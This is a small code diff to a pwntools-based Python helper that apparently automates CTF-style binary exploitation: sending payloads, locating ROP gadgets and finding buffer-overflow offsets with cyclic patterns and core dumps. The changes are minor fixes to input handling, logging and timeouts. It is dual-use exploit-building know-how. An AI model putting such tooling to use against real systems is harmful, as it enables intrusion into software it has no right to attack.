@@ -8,10 +8,12 @@ def err(error):
 
 def send_payload(payload,inputs,io):
 	for i in inputs:
+		if len(i) != 2 or i[1] != "":
+			io.recvuntil(i[1].encode())
 		if "payload" in i[0]:
-			io.sendafter(i[1].encode(),payload+i[0].lstrip("payload").encode())
+			io.send(payload+i[0].lstrip("payload").encode())
 		else:
-			io.sendafter(i[1].encode(),i[0].encode())
+			io.send(i[0].encode())
 
 
 def parse_input(inp):
@@ -32,7 +34,7 @@ def find_gadgets(gadget,chall):
 		err("Required ROPgadget(s) not found!")
 
 	gadg_addr = int(out.decode().split(" ")[0],16)
-	log.info(gadget.lstrip(": ")+" gadget-> "+hex(gadg_addr))
+	log.info(gadget.lstrip(": ")+" gadget -> "+hex(gadg_addr))
 
 	return gadg_addr
 
@@ -40,7 +42,7 @@ def find_gadgets(gadget,chall):
 def find_offset(args,n):
 	io = start(False,args.chall,args.libc)
 	send_payload(cyclic(512,n=n),args.inputs,io)
-	io.wait()
+	io.wait(timeout=3)
 	core = io.corefile
 	io.close()
 	subprocess.run("rm core*",shell=True)
